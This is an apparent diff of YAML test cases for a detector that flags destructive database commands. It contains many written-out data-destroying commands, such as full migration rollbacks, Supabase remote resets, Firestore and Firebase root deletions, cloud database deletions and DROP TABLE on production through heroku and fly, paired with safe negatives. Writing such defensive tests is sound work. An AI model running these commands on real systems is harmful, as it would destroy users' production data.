+  description: "with env and repo option"
+  expect_ids: ["database:ecto_rollback_all"]
+- test: "mix ecto.rollback"
+  description: "one step"
+  expect_ids: []
+- test: "mix ecto.rollback --step 1"
+  description: "the safe alternative"
+  expect_ids: []
+# -- database:golang_migrate_down_all --
+- test: "migrate -path m -database postgres://prod/app down -all"
+  description: "golang-migrate down -all"
+  expect_ids: ["database:golang_migrate_down_all"]
+- test: "migrate -source file://m -database $DB down --all"
+  description: "double-dash flag"
+  expect_ids: ["database:golang_migrate_down_all"]
+- test: "migrate -path m -database postgres://prod/app down 1"
+  description: "one step down"
+  expect_ids: []
+- test: "migrate -path m -database postgres://prod/app up"
+  description: "migrating up"
+  expect_ids: []
+- test: "migrate -path m -database postgres://prod/app drop -f"
+  description: "drop stays the Critical check"
+  expect_ids: ["database:golang_migrate_drop"]
+# -- database:goose_reset --
+- test: "goose down-to 0"
+  description: "down-to 0 rolls back everything"
+  expect_ids: ["database:goose_reset"]
+- test: "goose postgres \"user=x dbname=y\" down-to 0"
+  description: "with driver and dsn"
+  expect_ids: ["database:goose_reset"]
+- test: "goose down-to 20230101"
+  description: "down-to a version"
+  expect_ids: []
+- test: "goose down"
+  description: "one step down"
+  expect_ids: []
+# -- database:alembic_downgrade_base --
+- test: "flask db downgrade base"
+  description: "Flask-Migrate is alembic"
+  expect_ids: ["database:alembic_downgrade_base"]
+- test: "flask --app app db downgrade base"
+  description: "flask with --app"
+  expect_ids: ["database:alembic_downgrade_base"]
+- test: "flask db downgrade -1"
+  description: "one step"
+  expect_ids: []
+- test: "flask db downgrade base --sql"
+  description: "offline SQL only"
+  expect_ids: []
+- test: "flask db upgrade"
+  description: "upgrading"
+  expect_ids: []
+# -- database:django_flush --
+- test: "python -m django flush --noinput"
+  description: "python -m django like django-admin"
+  expect_ids: ["database:django_flush"]
+- test: "python3 -m django flush"
+  description: "python3 -m django"
+  expect_ids: ["database:django_flush"]
+- test: "python -m django migrate"
+  description: "migrating"
+  expect_ids: []
+- test: "python manage.py dumpdata --output backup.json"
+  description: "the backup alternative"
+  expect_ids: []
+# -- database:django_migrate_zero --
+- test: "python manage.py migrate --database=prod app zero"
+  description: "an option before the app"
+  expect_ids: ["database:django_migrate_zero"]
+- test: "python manage.py migrate --database prod app zero"
+  description: "an option with a separate value"
+  expect_ids: ["database:django_migrate_zero"]
+- test: "python -m django migrate app zero"
+  description: "python -m django"
+  expect_ids: ["database:django_migrate_zero"]
+- test: "python manage.py migrate app zero --plan"
+  description: "--plan only prints the operations"
+  expect_ids: []
+- test: "python manage.py migrate app 0003"
+  description: "migrating to a named migration"
+  expect_ids: []
+
+# -- database:supabase_db_reset_remote / database:supabase_db_reset --
+- test: "supabase db reset --linked"
+  description: "resetting the linked remote Supabase database"
+  expect_ids: ["database:supabase_db_reset_remote"]
+- test: "npx supabase db reset --db-url postgres://prod"
+  description: "resetting a remote database by URL"
+  expect_ids: ["database:supabase_db_reset_remote"]
+- test: "supabase db reset"
+  description: "resetting the local Supabase database"
+  expect_ids: ["database:supabase_db_reset"]
+- test: "npx supabase db reset --debug"
+  description: "local reset through npx"
+  expect_ids: ["database:supabase_db_reset"]
+- test: "supabase db dump --linked -f backup.sql"
+  description: "a dump is safe"
+  expect_ids: []
+
+# -- database:supabase_projects_delete --
+- test: "supabase projects delete abcdefghijklmnop"
+  description: "deleting a Supabase project"
+  expect_ids: ["database:supabase_projects_delete"]
+- test: "supabase projects list"
+  description: "listing projects is safe"
+  expect_ids: []
+
+# -- database:firebase_firestore_delete_all / database:firebase_firestore_delete --
+- test: "firebase firestore:delete --all-collections --force"
+  description: "deleting every Firestore collection"
+  expect_ids: ["database:firebase_firestore_delete_all"]
+- test: "firebase firestore:delete -r /users --force"
+  description: "recursive delete of a collection"
+  expect_ids: ["database:firebase_firestore_delete"]
+- test: "firebase firestore:indexes"
+  description: "listing indexes is safe"
+  expect_ids: []
+
+# -- database:firebase_database_remove_root / database:firebase_database_remove --
+- test: "firebase database:remove / --force"
+  description: "removing the whole Realtime Database"
+  expect_ids: ["database:firebase_database_remove_root"]
+- test: "firebase database:remove --force /"
+  description: "options before the root path"
+  expect_ids: ["database:firebase_database_remove_root"]
+- test: "firebase database:remove /users/42 --force"
+  description: "removing one path"
+  expect_ids: ["database:firebase_database_remove"]
+- test: "firebase database:get / -o backup.json"
+  description: "reading the database is safe"
+  expect_ids: []
+
+# -- Cloudflare D1 / KV / R2, Neon, PlanetScale, Turso --
+- test: "npx wrangler d1 delete prod-db"
+  description: "deletes a D1 database (through npx)"
+  expect_ids: ["database:wrangler_d1_delete"]
+- test: "npx wrangler d1 execute prod --remote --command \"DROP TABLE users\""
+  description: "SQL run on the remote D1 database is checked as SQL"
+  expect_ids: ["database:drop_table"]
+- test: "npx wrangler d1 execute prod --command \"DROP TABLE users\""
+  description: "negative: without --remote it runs on the local dev copy"
+  expect_ids: []
+- test: "wrangler kv namespace delete --binding CACHE"
+  description: "deletes a KV namespace"
+  expect_ids: ["database:wrangler_kv_namespace_delete"]
+- test: "wrangler kv:namespace delete --namespace-id abc"
+  description: "older kv:namespace spelling"
+  expect_ids: ["database:wrangler_kv_namespace_delete"]
+- test: "npx wrangler r2 bucket delete assets"
+  description: "deletes an R2 bucket"
+  expect_ids: ["database:wrangler_r2_bucket_delete"]
+- test: "wrangler r2 bucket list"
+  description: "negative: listing buckets"
+  expect_ids: []
+- test: "neonctl projects delete p"
+  description: "deletes a Neon project"
+  expect_ids: ["database:neon_project_delete"]
+- test: "neonctl branches delete main"
+  description: "deletes a Neon branch"
+  expect_ids: ["database:neon_branch_delete"]
+- test: "neonctl branches list"
+  description: "negative: listing branches"
+  expect_ids: []
+- test: "pscale database delete app --force"
+  description: "deletes a PlanetScale database"
+  expect_ids: ["database:pscale_database_delete"]
+- test: "pscale branch delete app dev"
+  description: "deletes a PlanetScale branch"
+  expect_ids: ["database:pscale_branch_delete"]
+- test: "turso db destroy app --yes"
+  description: "destroys a Turso database"
+  expect_ids: ["database:turso_db_destroy"]
+- test: "turso db list"
+  description: "negative: listing databases"
+  expect_ids: []
+
+# -- npm package spellings: the package's command --
+- test: "npx firebase-tools firestore:delete --all-collections --force"
+  description: "firebase-tools is the firebase command"
+  expect_ids: ["database:firebase_firestore_delete_all"]
+- test: "npx -y firebase-tools@latest firestore:delete --all-collections --force"
+  description: "a version tag is dropped"
+  expect_ids: ["database:firebase_firestore_delete_all"]
+- test: "npx supabase@latest db reset --linked"
+  description: "supabase@latest is supabase"
+  expect_ids: ["database:supabase_db_reset_remote"]
+- test: "pnpm dlx supabase@1.200.3 db reset --linked"
+  description: "pnpm dlx with a version"
+  expect_ids: ["database:supabase_db_reset_remote"]
+- test: "bunx supabase@latest db reset --linked"
+  description: "bunx with a tag"
+  expect_ids: ["database:supabase_db_reset_remote"]
+
+# -- hosting-platform remote runs: the command / SQL is checked --
+- test: "heroku run psql -c \"DROP TABLE users\" -a app"
+  description: "heroku run with an unquoted command and a trailing app option"
+  expect_ids: ["psql:drop", "database:drop_table"]
+- test: "heroku run 'psql $DATABASE_URL -c \"DROP TABLE users\"'"
+  description: "heroku run with one quoted shell line"
+  expect_ids: ["psql:drop", "database:drop_table"]
+- test: "heroku pg:psql --command \"DELETE FROM users\" -a app"
+  description: "heroku pg:psql --command is SQL"
+  expect_ids: ["database:delete_all_rows"]
+- test: "heroku pg:psql -a app -c \"DROP TABLE users\""
+  description: "heroku pg:psql -c is SQL"
+  expect_ids: ["psql:drop", "database:drop_table"]
+- test: "fly ssh console -C \"psql -c 'DROP TABLE users'\""
+  description: "fly ssh console -C runs the command on the machine"
+  expect_ids: ["psql:drop", "database:drop_table"]
+- test: "heroku run ls -a app"
+  description: "negative: a harmless remote command"
+  expect_ids: []
